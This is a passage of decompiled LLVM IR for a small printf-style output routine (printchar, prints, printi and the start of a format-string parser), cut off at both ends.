  uselistorder label %dec_label_pc_8048329, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804830e, { 1, 0 }
  uselistorder label %dec_label_pc_80482e6, { 1, 0 }
}

define i32 @printchar(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_8 = alloca i8, align 1
  %tmp8 = trunc i32 %arg2 to i8
  store i8 %tmp8, i8* %stack_var_8, align 1
  %v4_804836c = icmp eq i32* %arg1, null
  br i1 %v4_804836c, label %dec_label_pc_804838b, label %dec_label_pc_8048372

dec_label_pc_8048372:                             ; preds = %entry
  %tmp3 = ptrtoint i32* %arg1 to i32
  %v2_8048375 = load i32, i32* %arg1, align 4
  %v3_804837a = inttoptr i32 %v2_8048375 to i8*
  store i8 %tmp8, i8* %v3_804837a, align 1
  %v2_804837f = load i32, i32* %arg1, align 4
  %v1_8048381 = add i32 %v2_804837f, 1
  store i32 %v1_8048381, i32* @edx, align 4
  store i32 %v1_8048381, i32* %arg1, align 4
  br label %dec_label_pc_804839e

dec_label_pc_804838b:                             ; preds = %entry
  %v3_8048396 = bitcast i8* %stack_var_8 to i32*
  %v4_8048396 = call i32 @__libc_write(i32 1, i32* %v3_8048396, i32 1)
  br label %dec_label_pc_804839e

dec_label_pc_804839e:                             ; preds = %dec_label_pc_8048372, %dec_label_pc_804838b
  %v0_804839f = phi i32 [ %tmp3, %dec_label_pc_8048372 ], [ %v4_8048396, %dec_label_pc_804838b ]
  ret i32 %v0_804839f

; uselistorder directives
  uselistorder i32* %arg1, { 0, 1, 2, 4, 3 }
  uselistorder label %dec_label_pc_804839e, { 1, 0 }
}

define i32 @prints(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp25 = icmp slt i32 %arg3, 1
  br i1 %tmp25, label %dec_label_pc_8048400, label %dec_label_pc_80483ba

dec_label_pc_80483ba:                             ; preds = %entry
  %v4_80483c1 = ptrtoint i8* %arg2 to i32
  store i32 %v4_80483c1, i32* @edx, align 4
  %v2_80483d256 = load i8, i8* %arg2, align 1
  %v3_80483d257 = zext i8 %v2_80483d256 to i32
  %v5_80483d258 = and i32 %v4_80483c1, -256
  %v6_80483d259 = or i32 %v3_80483d257, %v5_80483d258
  %v4_80483d460 = icmp eq i8 %v2_80483d256, 0
  %v1_80483d661 = icmp eq i1 %v4_80483d460, false
  br i1 %v1_80483d661, label %dec_label_pc_80483c9, label %dec_label_pc_80483d8

dec_label_pc_80483c9:                             ; preds = %dec_label_pc_80483ba, %dec_label_pc_80483c9
  %v6_80483d264 = phi i32 [ %v6_80483d2, %dec_label_pc_80483c9 ], [ %v6_80483d259, %dec_label_pc_80483ba ]
  %v4_80483cf63 = phi i32 [ %v5_80483cc, %dec_label_pc_80483c9 ], [ %v4_80483c1, %dec_label_pc_80483ba ]
  %stack_var_-12.062 = phi i32 [ %v4_80483c9, %dec_label_pc_80483c9 ], [ 0, %dec_label_pc_80483ba ]
  %v4_80483c9 = add i32 %stack_var_-12.062, 1
  %v5_80483cc = add i32 %v4_80483cf63, 1
  %v22_80483cc = inttoptr i32 %v5_80483cc to i8*
  store i32 %v5_80483cc, i32* @edx, align 4
  %v2_80483d2 = load i8, i8* %v22_80483cc, align 1
  %v3_80483d2 = zext i8 %v2_80483d2 to i32
  %v5_80483d2 = and i32 %v6_80483d264, -256
  %v6_80483d2 = or i32 %v3_80483d2, %v5_80483d2
  %v4_80483d4 = icmp eq i8 %v2_80483d2, 0
  %v1_80483d6 = icmp eq i1 %v4_80483d4, false
  br i1 %v1_80483d6, label %dec_label_pc_80483c9, label %dec_label_pc_80483d8

dec_label_pc_80483d8:                             ; preds = %dec_label_pc_80483c9, %dec_label_pc_80483ba
  %stack_var_-12.0.lcssa = phi i32 [ 0, %dec_label_pc_80483ba ], [ %v4_80483c9, %dec_label_pc_80483c9 ]
  %v5_80483de = icmp slt i32 %stack_var_-12.0.lcssa, %arg3
  br i1 %v5_80483de, label %dec_label_pc_80483e9, label %dec_label_pc_80483ef

dec_label_pc_80483e9:                             ; preds = %dec_label_pc_80483d8
  store i32 %stack_var_-12.0.lcssa, i32* @edx, align 4
  %v5_80483ec = sub i32 %arg3, %stack_var_-12.0.lcssa
  br label %dec_label_pc_80483ef

dec_label_pc_80483ef:                             ; preds = %dec_label_pc_80483d8, %dec_label_pc_80483e9
  %storemerge = phi i32 [ %v5_80483ec, %dec_label_pc_80483e9 ], [ 0, %dec_label_pc_80483d8 ]
  %v1_80483f2 = and i32 %arg4, 2
  %tmp26 = mul nuw nsw i32 %v1_80483f2, 8
  %tmp27 = or i32 %tmp26, 32
  br label %dec_label_pc_8048400

dec_label_pc_8048400:                             ; preds = %dec_label_pc_80483ef, %entry
  %stack_var_12.0 = phi i32 [ %arg3, %entry ], [ %storemerge, %dec_label_pc_80483ef ]
  %stack_var_-16.0 = phi i32 [ 32, %entry ], [ %tmp27, %dec_label_pc_80483ef ]
  %v1_8048403 = urem i32 %arg4, 2
  %v2_8048403 = icmp eq i32 %v1_8048403, 0
  %v1_8048408 = icmp eq i1 %v2_8048403, false
  %.pre11 = inttoptr i32 %arg1 to i32*
  br i1 %v1_8048408, label %dec_label_pc_804844a.preheader, label %dec_label_pc_8048423.preheader

dec_label_pc_8048423.preheader:                   ; preds = %dec_label_pc_8048400
  %tmp2849 = icmp slt i32 %stack_var_12.0, 1
  %tmp2950 = icmp eq i1 %tmp2849, false
  br i1 %tmp2950, label %dec_label_pc_804840c.lr.ph, label %dec_label_pc_804844a.preheader

dec_label_pc_804840c.lr.ph:                       ; preds = %dec_label_pc_8048423.preheader
  br label %dec_label_pc_804840c

dec_label_pc_804840c:                             ; preds = %dec_label_pc_804840c.lr.ph, %dec_label_pc_804840c
  %stack_var_-20.052 = phi i32 [ 0, %dec_label_pc_804840c.lr.ph ], [ %v4_804841d, %dec_label_pc_804840c ]
  %stack_var_12.151 = phi i32 [ %stack_var_12.0, %dec_label_pc_804840c.lr.ph ], [ %v4_8048420, %dec_label_pc_804840c ]
  %v3_8048415 = call i32 @printchar(i32* %.pre11, i32 %stack_var_-16.0)
  %v4_804841d = add i32 %stack_var_-20.052, 1
  %v4_8048420 = add i32 %stack_var_12.151, -1
  %tmp28 = icmp slt i32 %v4_8048420, 1
  %tmp29 = icmp eq i1 %tmp28, false
  br i1 %tmp29, label %dec_label_pc_804840c, label %dec_label_pc_804844a.preheader

dec_label_pc_804844a.preheader:                   ; preds = %dec_label_pc_8048423.preheader, %dec_label_pc_804840c, %dec_label_pc_8048400
  %stack_var_12.2.ph = phi i32 [ %stack_var_12.0, %dec_label_pc_8048400 ], [ %stack_var_12.0, %dec_label_pc_8048423.preheader ], [ %v4_8048420, %dec_label_pc_804840c ]
  %stack_var_-20.1.ph = phi i32 [ 0, %dec_label_pc_8048400 ], [ 0, %dec_label_pc_8048423.preheader ], [ %v4_804841d, %dec_label_pc_804840c ]
  %v2_804844d38 = load i8, i8* %arg2, align 1
  %v4_804844f42 = icmp eq i8 %v2_804844d38, 0
  %v1_804845143 = icmp eq i1 %v4_804844f42, false
  br i1 %v1_804845143, label %dec_label_pc_804842b.lr.ph, label %dec_label_pc_804846c.preheader

dec_label_pc_804842b.lr.ph:                       ; preds = %dec_label_pc_804844a.preheader
  %v4_804844a37 = ptrtoint i8* %arg2 to i32
  br label %dec_label_pc_804842b

dec_label_pc_804842b:                             ; preds = %dec_label_pc_804842b.lr.ph, %dec_label_pc_804842b
  %v4_804844a46 = phi i32 [ %v4_804844a37, %dec_label_pc_804842b.lr.ph ], [ %v5_8048447, %dec_label_pc_804842b ]
  %stack_var_-20.145 = phi i32 [ %stack_var_-20.1.ph, %dec_label_pc_804842b.lr.ph ], [ %v4_8048444, %dec_label_pc_804842b ]
  %stack_var_8.044 = phi i8* [ %arg2, %dec_label_pc_804842b.lr.ph ], [ %v22_8048447, %dec_label_pc_804842b ]
  %v2_804842e = load i8, i8* %stack_var_8.044, align 1
  %v3_804842e = zext i8 %v2_804842e to i32
  %v3_804843c = call i32 @printchar(i32* %.pre11, i32 %v3_804842e)
  %v4_8048444 = add i32 %stack_var_-20.145, 1
  %v5_8048447 = add i32 %v4_804844a46, 1
  %v22_8048447 = inttoptr i32 %v5_8048447 to i8*
  %v2_804844d = load i8, i8* %v22_8048447, align 1
  %v4_804844f = icmp eq i8 %v2_804844d, 0
  %v1_8048451 = icmp eq i1 %v4_804844f, false
  br i1 %v1_8048451, label %dec_label_pc_804842b, label %dec_label_pc_804846c.preheader

dec_label_pc_804846c.preheader:                   ; preds = %dec_label_pc_804842b, %dec_label_pc_804844a.preheader
  %stack_var_-20.1.lcssa = phi i32 [ %stack_var_-20.1.ph, %dec_label_pc_804844a.preheader ], [ %v4_8048444, %dec_label_pc_804842b ]
  %tmp3033 = icmp slt i32 %stack_var_12.2.ph, 1
  %tmp3134 = icmp eq i1 %tmp3033, false
  br i1 %tmp3134, label %dec_label_pc_8048455.lr.ph, label %dec_label_pc_8048472

dec_label_pc_8048455.lr.ph:                       ; preds = %dec_label_pc_804846c.preheader
  br label %dec_label_pc_8048455

dec_label_pc_8048455:                             ; preds = %dec_label_pc_8048455.lr.ph, %dec_label_pc_8048455
  %stack_var_-20.236 = phi i32 [ %stack_var_-20.1.lcssa, %dec_label_pc_8048455.lr.ph ], [ %v4_8048466, %dec_label_pc_8048455 ]
  %stack_var_12.335 = phi i32 [ %stack_var_12.2.ph, %dec_label_pc_8048455.lr.ph ], [ %v4_8048469, %dec_label_pc_8048455 ]
  %v3_804845e = call i32 @printchar(i32* %.pre11, i32 %stack_var_-16.0)
  %v4_8048466 = add i32 %stack_var_-20.236, 1
  %v4_8048469 = add i32 %stack_var_12.335, -1
  %tmp30 = icmp slt i32 %v4_8048469, 1
  %tmp31 = icmp eq i1 %tmp30, false
  br i1 %tmp31, label %dec_label_pc_8048455, label %dec_label_pc_8048472

dec_label_pc_8048472:                             ; preds = %dec_label_pc_8048455, %dec_label_pc_804846c.preheader
  %stack_var_-20.2.lcssa = phi i32 [ %stack_var_-20.1.lcssa, %dec_label_pc_804846c.preheader ], [ %v4_8048466, %dec_label_pc_8048455 ]
  ret i32 %stack_var_-20.2.lcssa

; uselistorder directives
  uselistorder i32 %v5_8048447, { 1, 0 }
  uselistorder i32 %stack_var_-16.0, { 1, 0 }
  uselistorder i32 %stack_var_-12.0.lcssa, { 1, 2, 0 }
  uselistorder i32 %v5_80483cc, { 1, 2, 0 }
  uselistorder i32 %v4_80483c1, { 0, 2, 1 }
  uselistorder i32 %arg3, { 3, 1, 2, 0 }
  uselistorder i8* %arg2, { 1, 3, 2, 0, 4 }
  uselistorder label %dec_label_pc_8048455, { 1, 0 }
  uselistorder label %dec_label_pc_804842b, { 1, 0 }
  uselistorder label %dec_label_pc_804844a.preheader, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804840c, { 1, 0 }
  uselistorder label %dec_label_pc_80483ef, { 1, 0 }
  uselistorder label %dec_label_pc_80483c9, { 1, 0 }
}

define i32 @printi(i32 %arg1) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-40 = alloca i8*, align 4
  %tmp27 = call i32 @__decompiler_undefined_function_0()
  %tmp28 = call i32 @__decompiler_undefined_function_0()
  %tmp31 = call i32 @__decompiler_undefined_function_0()
  %tmp32 = call i32 @__decompiler_undefined_function_0()
  %tmp35 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-5 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v5_804848e = sext i32 %tmp35 to i64
  %v4_8048491 = icmp eq i32 %tmp35, 0
  %v5_8048491 = icmp slt i32 %tmp35, 0
  %v1_8048495 = icmp eq i1 %v4_8048491, false
  br i1 %v1_8048495, label %dec_label_pc_80484bc, label %dec_label_pc_8048497

dec_label_pc_8048497:                             ; preds = %entry
  store i32 48, i32* %stack_var_-16, align 4
  %tmp47 = bitcast i32* %stack_var_-16 to i8*
  %v6_80484ac = call i32 @prints(i32 %arg1, i8* %tmp47, i32 %tmp31, i32 %tmp32)
  br label %dec_label_pc_8048597

dec_label_pc_80484bc:                             ; preds = %entry
  %v4_80484bc = icmp eq i32 %tmp28, 0
  br i1 %v4_80484bc, label %dec_label_pc_80484dd, label %dec_label_pc_80484c2

dec_label_pc_80484c2:                             ; preds = %dec_label_pc_80484bc
  %v12_80484c2 = icmp eq i32 %tmp27, 10
  %v1_80484c6 = icmp eq i1 %v12_80484c2, false
  br i1 %v1_80484c6, label %dec_label_pc_80484dd, label %dec_label_pc_80484c8

dec_label_pc_80484c8:                             ; preds = %dec_label_pc_80484c2
  %v1_80484cc = icmp eq i1 %v5_8048491, false
  br i1 %v1_80484cc, label %dec_label_pc_80484dd, label %dec_label_pc_80484ce

dec_label_pc_80484ce:                             ; preds = %dec_label_pc_80484c8
  %v1_80484d8 = sub i32 0, %tmp35
  %v5_80484da = sext i32 %v1_80484d8 to i64
  br label %dec_label_pc_80484dd

dec_label_pc_80484dd:                             ; preds = %dec_label_pc_80484c8, %dec_label_pc_80484c2, %dec_label_pc_80484bc, %dec_label_pc_80484ce
  %stack_var_-24.0 = phi i64 [ %v5_804848e, %dec_label_pc_80484bc ], [ %v5_804848e, %dec_label_pc_80484c2 ], [ %v5_804848e, %dec_label_pc_80484c8 ], [ %v5_80484da, %dec_label_pc_80484ce ]
  %stack_var_-32.0 = phi i32 [ 0, %dec_label_pc_80484bc ], [ 0, %dec_label_pc_80484c2 ], [ 0, %dec_label_pc_80484c8 ], [ 1, %dec_label_pc_80484ce ]
  %v15_80484e0 = ptrtoint i32* %stack_var_-5 to i32
  %tmp48 = bitcast i32* %stack_var_-5 to i8*
  store i8* %tmp48, i8** %stack_var_-40, align 4
  store i8 0, i8* %tmp48, align 4
  %v4_804853e7 = trunc i64 %stack_var_-24.0 to i32
  %v5_804853e8 = icmp eq i32 %v4_804853e7, 0
  %v1_804854215 = icmp eq i1 %v5_804853e8, false
  br i1 %v1_804854215, label %dec_label_pc_80484ee.lr.ph, label %dec_label_pc_8048544

dec_label_pc_80484ee.lr.ph:                       ; preds = %dec_label_pc_80484dd
  %v5_80484f1 = sext i32 %tmp27 to i64
  br label %dec_label_pc_80484ee

dec_label_pc_80484ee:                             ; preds = %dec_label_pc_80484ee.lr.ph, %dec_label_pc_8048516
  %v3_804851618 = phi i8* [ %tmp48, %dec_label_pc_80484ee.lr.ph ], [ %v22_8048516, %dec_label_pc_8048516 ]
  %stack_var_-24.116 = phi i64 [ %stack_var_-24.0, %dec_label_pc_80484ee.lr.ph ], [ %v5_804853b, %dec_label_pc_8048516 ]
  %v6_80484fc = and i64 %stack_var_-24.116, 4294967295
  %v12_80484fc = udiv i64 %v6_80484fc, %v5_80484f1
  %v13_80484fc = trunc i64 %v12_80484fc to i32
  %v14_80484fc = urem i64 %v6_80484fc, %v5_80484f1
  %v5_8048501 = trunc i64 %v14_80484fc to i8
  %v7_8048508 = icmp sgt i8 %v5_8048501, 9
  br i1 %v7_8048508, label %dec_label_pc_804850a, label %dec_label_pc_8048516

dec_label_pc_804850a:                             ; preds = %dec_label_pc_80484ee
  %tmp52 = trunc i64 %v14_80484fc to i32
  %v5_804850d = add i32 %tmp52, %tmp
  %v1_8048510 = add i32 %v5_804850d, 198
  %v11_8048510 = trunc i32 %v1_8048510 to i8
  br label %dec_label_pc_8048516

dec_label_pc_8048516:                             ; preds = %dec_label_pc_80484ee, %dec_label_pc_804850a
  %stack_var_-36.0 = phi i8 [ %v11_8048510, %dec_label_pc_804850a ], [ %v5_8048501, %dec_label_pc_80484ee ]
  %v4_8048516 = ptrtoint i8* %v3_804851618 to i32
  %v5_8048516 = add i32 %v4_8048516, -1
  %v22_8048516 = inttoptr i32 %v5_8048516 to i8*
  %v1_804851c = add i8 %stack_var_-36.0, 48
  store i8 %v1_804851c, i8* %v22_8048516, align 1
  %v5_804853b = sext i32 %v13_80484fc to i64
  %v5_804853e = icmp eq i32 %v13_80484fc, 0
  %v1_8048542 = icmp eq i1 %v5_804853e, false
  br i1 %v1_8048542, label %dec_label_pc_80484ee, label %dec_label_pc_804853e.dec_label_pc_8048544_crit_edge

dec_label_pc_804853e.dec_label_pc_8048544_crit_edge: ; preds = %dec_label_pc_8048516
  store i8* %v22_8048516, i8** %stack_var_-40, align 4
  br label %dec_label_pc_8048544

dec_label_pc_8048544:                             ; preds = %dec_label_pc_804853e.dec_label_pc_8048544_crit_edge, %dec_label_pc_80484dd
  %v3_8048581622 = phi i32 [ %v5_8048516, %dec_label_pc_804853e.dec_label_pc_8048544_crit_edge ], [ %v15_80484e0, %dec_label_pc_80484dd ]
  %v3_8048572 = phi i8* [ %v22_8048516, %dec_label_pc_804853e.dec_label_pc_8048544_crit_edge ], [ %tmp48, %dec_label_pc_80484dd ]
  %v4_8048544 = icmp eq i32 %stack_var_-32.0, 0
  br i1 %v4_8048544, label %dec_label_pc_804857b, label %dec_label_pc_804854a

dec_label_pc_804854a:                             ; preds = %dec_label_pc_8048544
  %v4_804854a = icmp eq i32 %tmp31, 0
  br i1 %v4_804854a, label %dec_label_pc_8048572, label %dec_label_pc_8048550

dec_label_pc_8048550:                             ; preds = %dec_label_pc_804854a
  %v1_8048553 = and i32 %tmp32, 2
  %v2_8048553 = icmp eq i32 %v1_8048553, 0
  br i1 %v2_8048553, label %dec_label_pc_8048572, label %dec_label_pc_804855a

dec_label_pc_804855a:                             ; preds = %dec_label_pc_8048550
  %v3_8048562 = inttoptr i32 %arg1 to i32*
  %v4_8048562 = call i32 @printchar(i32* %v3_8048562, i32 45)
  %v4_804856d = add i32 %tmp31, -1
  br label %dec_label_pc_804857b

dec_label_pc_8048572:                             ; preds = %dec_label_pc_8048550, %dec_label_pc_804854a
  %v4_8048572 = ptrtoint i8* %v3_8048572 to i32
  %v5_8048572 = add i32 %v4_8048572, -1
  %v22_8048572 = inttoptr i32 %v5_8048572 to i8*
  store i8* %v22_8048572, i8** %stack_var_-40, align 4
  store i8 45, i8* %v22_8048572, align 1
  %.phi.trans.insert = bitcast i8** %stack_var_-40 to i32*
  %v3_80485816.pre = load i32, i32* %.phi.trans.insert, align 4
  br label %dec_label_pc_804857b

dec_label_pc_804857b:                             ; preds = %dec_label_pc_8048544, %dec_label_pc_804855a, %dec_label_pc_8048572
  %v3_80485816 = phi i32 [ %v3_8048581622, %dec_label_pc_8048544 ], [ %v3_80485816.pre, %dec_label_pc_8048572 ], [ %v3_8048581622, %dec_label_pc_804855a ]
  %stack_var_20.0 = phi i32 [ %tmp31, %dec_label_pc_8048544 ], [ %tmp31, %dec_label_pc_8048572 ], [ %v4_804856d, %dec_label_pc_804855a ]
  %stack_var_-28.0 = phi i32 [ 0, %dec_label_pc_8048544 ], [ 0, %dec_label_pc_8048572 ], [ 1, %dec_label_pc_804855a ]
  %v1_8048587.cast = inttoptr i32 %v3_80485816 to i8*
  %v6_8048587 = call i32 @prints(i32 %arg1, i8* %v1_8048587.cast, i32 %stack_var_20.0, i32 %tmp32)
  %v2_8048592 = add i32 %v6_8048587, %stack_var_-28.0
  store i32 %v2_8048592, i32* @edx, align 4
  br label %dec_label_pc_8048597

dec_label_pc_8048597:                             ; preds = %dec_label_pc_8048497, %dec_label_pc_804857b
  %storemerge = phi i32 [ %v2_8048592, %dec_label_pc_804857b ], [ %v6_80484ac, %dec_label_pc_8048497 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8* %v22_8048516, { 0, 1, 3, 2 }
  uselistorder i8 %v5_8048501, { 1, 0 }
  uselistorder i64 %v6_80484fc, { 1, 0 }
  uselistorder i32 %tmp35, { 3, 1, 2, 0 }
  uselistorder i32 %tmp32, { 0, 2, 1 }
  uselistorder i32 %tmp31, { 2, 4, 1, 3, 0 }
  uselistorder i32 %tmp27, { 1, 0 }
  uselistorder i8** %stack_var_-40, { 0, 3, 1, 2 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8048597, { 1, 0 }
  uselistorder label %dec_label_pc_804857b, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8048516, { 1, 0 }
  uselistorder label %dec_label_pc_80484ee, { 1, 0 }
  uselistorder label %dec_label_pc_80484dd, { 3, 0, 1, 2 }
}

define i32 @print(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg1 to i32
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-6 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804859c = load i32, i32* @ebp, align 4
  store i32 %v0_804859c, i32* %stack_var_-4, align 4
  %v15_804859f = ptrtoint i32* %stack_var_-44 to i32
  %v2_8048791 = ptrtoint i32* %stack_var_-6 to i32
  %stack_var_8.444 = inttoptr i32 %arg2 to i8*
  store i32 %arg2, i32* %eax.global-to-local, align 4
  %v2_80487c745 = load i8, i8* %stack_var_8.444, align 1
  %v3_80487c746 = zext i8 %v2_80487c745 to i32
  %v5_80487c747 = and i32 %arg2, -256
  %v6_80487c748 = or i32 %v3_80487c746, %v5_80487c747
  store i32 %v6_80487c748, i32* %eax.global-to-local, align 4
  %v4_80487c949 = icmp eq i8 %v2_80487c745, 0
  %v1_80487cb50 = icmp eq i1 %v4_80487c949, false
  br i1 %v1_80487cb50, label %dec_label_pc_80485ae, label %dec_label_pc_80487d1

dec_label_pc_80485ae:                             ; preds = %entry, %dec_label_pc_80487c1
  %v0_80487af = phi i32 [ %v4_804867366, %dec_label_pc_80487c1 ], [ %v15_804859f, %entry ]
  %v5_80487c756 = phi i32 [ %v5_80487c7, %dec_label_pc_80487c1 ], [ %v5_80487c747, %entry ]
  %stack_var_8.455 = phi i8* [ %stack_var_8.4, %dec_label_pc_80487c1 ], [ %stack_var_8.444, %entry ]
  %stack_var_-28.154 = phi i32 [ %stack_var_-28.0, %dec_label_pc_80487c1 ], [ 0, %entry ]
  %stack_var_8.4.in53 = phi i32 [ %v5_80487c1, %dec_label_pc_80487c1 ], [ %arg2, %entry ]
  %stack_var_12.152 = phi i32 [ %stack_var_12.0, %dec_label_pc_80487c1 ], [ %arg3, %entry ]
  %stack_var_-24.151 = phi i32 [ %stack_var_-24.0, %dec_label_pc_80487c1 ], [ %tmp5, %entry ]
  store i32 %stack_var_8.4.in53, i32* %eax.global-to-local, align 4
  %v2_80485b1 = load i8, i8* %stack_var_8.455, align 1
  %v3_80485b1 = zext i8 %v2_80485b1 to i32
  %v6_80485b1 = or i32 %v3_80485b1, %v5_80487c756
  store i32 %v6_80485b1, i32* %eax.global-to-local, align 4
  %v10_80485b3 = icmp eq i8 %v2_80485b1, 37
  %v1_80485b5 = icmp eq i1 %v10_80485b3, false
  br i1 %v1_80485b5, label %dec_label_pc_80487a5, label %dec_label_pc_80485bb

dec_label_pc_80485bb:                             ; preds = %dec_label_pc_80485ae
  %v5_80485bb = add i32 %stack_var_8.4.in53, 1
  %v22_80485bb = inttoptr i32 %v5_80485bb to i8*
  store i32 %v5_80485bb, i32* %eax.global-to-local, align 4
  %v2_80485ce = load i8, i8* %v22_80485bb, align 1
  %v3_80485ce = zext i8 %v2_80485ce to i32
  %v5_80485ce = and i32 %v5_80485bb, -256
  %v6_80485ce = or i32 %v3_80485ce, %v5_80485ce
  store i32 %v6_80485ce, i32* %eax.global-to-local, align 4
  %v4_80485d0 = icmp eq i8 %v2_80485ce, 0
  br i1 %v4_80485d0, label %dec_label_pc_80487d1, label %dec_label_pc_80485d8

dec_label_pc_80485d8:                             ; preds = %dec_label_pc_80485bb
  store i32 %v5_80485bb, i32* %eax.global-to-local, align 4
  %v2_80485db = load i8, i8* %v22_80485bb, align 1
  %v3_80485db = zext i8 %v2_80485db to i32
  %v6_80485db = or i32 %v3_80485db, %v5_80485ce
  store i32 %v6_80485db, i32* %eax.global-to-local, align 4
  %v10_80485dd = icmp eq i8 %v2_80485db, 37
  br i1 %v10_80485dd, label %dec_label_pc_80487a5, label %dec_label_pc_80485e5

dec_label_pc_80485e5:                             ; preds = %dec_label_pc_80485d8
  store i32 %v5_80485bb, i32* %eax.global-to-local, align 4
  %v2_80485e8 = load i8, i8* %v22_80485bb, align 1
  %v3_80485e8 = zext i8 %v2_80485e8 to i32
  %v6_80485e8 = or i32 %v3_80485e8, %v5_80485ce
  store i32 %v6_80485e8, i32* %eax.global-to-local, align 4
  %v10_80485ea = icmp eq i8 %v2_80485e8, 45
  %v1_80485ec = icmp eq i1 %v10_80485ea, false
  br i1 %v1_80485ec, label %dec_label_pc_8048601.preheader, label %dec_label_pc_80485ee

dec_label_pc_80485ee:                             ; preds = %dec_label_pc_80485e5
  %v5_80485ee = add i32 %stack_var_8.4.in53, 2
  %v22_80485ee = inttoptr i32 %v5_80485ee to i8*
  br label %dec_label_pc_8048601.preheader

dec_label_pc_8048601.preheader:                   ; preds = %dec_label_pc_80485ee, %dec_label_pc_80485e5
  %stack_var_8.0.ph = phi i8* [ %v22_80485bb, %dec_label_pc_80485e5 ], [ %v22_80485ee, %dec_label_pc_80485ee ]
  %stack_var_-32.0.ph = phi i32 [ 0, %dec_label_pc_80485e5 ], [ 1, %dec_label_pc_80485ee ]
  %v4_804860115 = ptrtoint i8* %stack_var_8.0.ph to i32
  store i32 %v4_804860115, i32* %eax.global-to-local, align 4
  %v2_804860416 = load i8, i8* %stack_var_8.0.ph, align 1
  %v3_804860417 = zext i8 %v2_804860416 to i32
  %v5_804860418 = and i32 %v4_804860115, -256
  %v6_804860419 = or i32 %v3_804860417, %v5_804860418
  store i32 %v6_804860419, i32* %eax.global-to-local, align 4
  %v7_804860621 = icmp eq i8 %v2_804860416, 48
  br i1 %v7_804860621, label %dec_label_pc_80485fa, label %dec_label_pc_8048630.preheader

dec_label_pc_80485fa:                             ; preds = %dec_label_pc_8048601.preheader, %dec_label_pc_80485fa
  %v4_804860123 = phi i32 [ %v5_80485fa, %dec_label_pc_80485fa ], [ %v4_804860115, %dec_label_pc_8048601.preheader ]
  %stack_var_-32.022 = phi i32 [ %v4_80485fd, %dec_label_pc_80485fa ], [ %stack_var_-32.0.ph, %dec_label_pc_8048601.preheader ]
  %v5_80485fa = add i32 %v4_804860123, 1
  %v22_80485fa = inttoptr i32 %v5_80485fa to i8*
  %v4_80485fd = or i32 %stack_var_-32.022, 2
  store i32 %v5_80485fa, i32* %eax.global-to-local, align 4
  %v2_8048604 = load i8, i8* %v22_80485fa, align 1
  %v3_8048604 = zext i8 %v2_8048604 to i32
  %v5_8048604 = and i32 %v5_80485fa, -256
  %v6_8048604 = or i32 %v3_8048604, %v5_8048604
  store i32 %v6_8048604, i32* %eax.global-to-local, align 4
  %v7_8048606 = icmp eq i8 %v2_8048604, 48
  br i1 %v7_8048606, label %dec_label_pc_80485fa, label %dec_label_pc_8048630.preheader

dec_label_pc_8048630.preheader:                   ; preds = %dec_label_pc_80485fa, %dec_label_pc_8048601.preheader
  %stack_var_-32.0.lcssa = phi i32 [ %stack_var_-32.0.ph, %dec_label_pc_8048601.preheader ], [ %v4_80485fd, %dec_label_pc_80485fa ]
  %stack_var_8.0.lcssa = phi i8* [ %stack_var_8.0.ph, %dec_label_pc_8048601.preheader ], [ %v22_80485fa, %dec_label_pc_80485fa ]
  %v4_804863025 = ptrtoint i8* %stack_var_8.0.lcssa to i32
  store i32 %v4_804863025, i32* %eax.global-to-local, align 4
  %v2_804863326 = load i8, i8* %stack_var_8.0.lcssa, align 1
  %v3_804863327 = zext i8 %v2_804863326 to i32
  %v5_804863328 = and i32 %v4_804863025, -256
  %v6_804863329 = or i32 %v3_804863327, %v5_804863328
  store i32 %v6_804863329, i32* %eax.global-to-local, align 4
  %tmp67 = icmp ult i8 %v2_804863326, 48
  br i1 %tmp67, label %dec_label_pc_8048642, label %dec_label_pc_8048639

dec_label_pc_804860c:                             ; preds = %dec_label_pc_8048639
  %v2_8048615 = mul i32 %stack_var_-36.032, 10
  store i32 %v4_804863034, i32* %eax.global-to-local, align 4
  %v2_804861d = load i8, i8* %stack_var_8.133, align 1
  %v3_804861d = zext i8 %v2_804861d to i32
  %v5_8048624 = add i32 %v3_804861d, %v2_8048615
  %v1_8048627 = add i32 %v5_8048624, -48
  %v5_804862d = add i32 %v4_804863034, 1
  %v22_804862d = inttoptr i32 %v5_804862d to i8*
  store i32 %v5_804862d, i32* %eax.global-to-local, align 4
  %v2_8048633 = load i8, i8* %v22_804862d, align 1
  %v3_8048633 = zext i8 %v2_8048633 to i32
  %v5_8048633 = and i32 %v5_804862d, -256
  %v6_8048633 = or i32 %v3_8048633, %v5_8048633
  store i32 %v6_8048633, i32* %eax.global-to-local, align 4
  %tmp68 = icmp ult i8 %v2_8048633, 48
  br i1 %tmp68, label %dec_label_pc_8048642, label %dec_label_pc_8048639

dec_label_pc_8048639:                             ; preds = %dec_label_pc_8048630.preheader, %dec_label_pc_804860c
  %v5_804863335 = phi i32 [ %v5_8048633, %dec_label_pc_804860c ], [ %v5_804863328, %dec_label_pc_8048630.preheader ]
  %v4_804863034 = phi i32 [ %v5_804862d, %dec_label_pc_804860c ], [ %v4_804863025, %dec_label_pc_8048630.preheader ]
  %stack_var_8.133 = phi i8* [ %v22_804862d, %dec_label_pc_804860c ], [ %stack_var_8.0.lcssa, %dec_label_pc_8048630.preheader ]
  %stack_var_-36.032 = phi i32 [ %v1_8048627, %dec_label_pc_804860c ], [ 0, %dec_label_pc_8048630.preheader ]
  store i32 %v4_804863034, i32* %eax.global-to-local, align 4
  %v2_804863c = load i8, i8* %stack_var_8.133, align 1
  %v3_804863c = zext i8 %v2_804863c to i32
  %v6_804863c = or i32 %v3_804863c, %v5_804863335
